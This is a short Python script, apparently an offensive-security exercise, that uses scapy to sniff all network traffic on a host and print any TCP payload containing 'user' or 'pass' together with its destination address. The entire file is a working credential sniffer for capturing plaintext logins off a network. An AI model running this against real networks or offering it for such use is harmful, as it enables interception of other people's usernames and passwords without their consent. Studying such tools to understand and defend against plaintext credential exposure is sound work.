from scapy.all import sniff, TCP, IP

#callback for receiving packets
def packet_callback(packet):
    mypacket = str(packet[TCP].payload)
    if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
        print(f"[*] Destination: {packet[IP].dst}")
        print(f"[*] {str(packet[TCP].payload)}")

def main():
    #activate the sniffer
    sniff(filter=None, prn=packet_callback, store=0)

if __name__ == '__main__':
    main()
